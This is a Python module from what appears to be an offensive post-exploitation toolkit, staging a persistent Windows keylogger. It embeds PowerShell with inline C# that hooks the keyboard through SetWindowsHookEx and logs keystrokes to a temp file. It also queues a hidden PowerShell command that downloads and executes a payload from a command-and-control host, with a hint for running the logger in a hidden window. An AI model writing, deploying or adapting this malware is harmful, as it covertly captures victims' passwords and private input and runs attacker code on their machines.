"""quantum.postexploit.kitlogger — persistent Windows keylogger staging."""
from __future__ import annotations

import os

from quantum.core.env import QCLI_DIR, local_ip
from quantum.core.logging import log
from quantum.postexploit.killswitch import TASKQ

_KL_HOOK = r"""
$src = @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public static class KL {
  [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
  private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
  [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
  [delegate] public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  private static LowLevelKeyboardProc _proc = HookCallback;
  private static IntPtr _hookID = IntPtr.Zero;
  public static System.Text.StringBuilder Buf = new System.Text.StringBuilder();
  private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
    if (nCode >= 0 && wParam == (IntPtr)0x0100) {
      int vk = Marshal.ReadInt32(lParam);
      Buf.Append(((char)vk).ToString());
    }
    return IntPtr.Zero;
  }
  public static void Run() {
    using (Process p = Process.GetCurrentProcess())
      using (ProcessModule m = p.MainModule)
        _hookID = SetWindowsHookEx(13, _proc, m.BaseAddress, 0);
  }
}
'@
Add-Type -TypeDefinition $src
while ($true) {
  [KL]::Run()
  Start-Sleep -Seconds 15
  if ([KL]::Buf.Length -gt 0) {
    Add-Content -Path "$env:TEMP\kl.klq" -Value ([KL]::Buf.ToString())
    [KL]::Buf.Clear() | Out-Null
  } else { Start-Sleep -Seconds 45 }
}
"""


def stage_keylogger(c2_host=None, c2_port=8443):
    """KITLOGGER: stages an in-line keylogger taskable via TASKQ. The payload
    writes a rolling buffer; every beacon pulls it; capture is sealed GRAYFISH
    at rest. Uses only PowerShell (no new binaries on target)."""
    c2 = c2_host or local_ip()
    fn = os.path.join(QCLI_DIR, "obsidian_keylogger.ps1")
    open(fn, "w").write(_KL_HOOK)
    # auto-task: the "tasking" mechanism is C2-driven; we instruct the operator how to launch
    TASKQ.setdefault("keylogger", {}).update(
        {"act": "run", "cmd": f"powershell -w hidden -c \"IEX(iwr http://{c2}:{c2_port}/s/default -UseBasicParsing)\"",
         "hint": f"Start-Process powershell -WindowStyle Hidden -File {fn}"})
    log(f"KITLOGGER staged: {fn}; TASKQ instruction set for host 'keylogger'", "C2")
    return fn
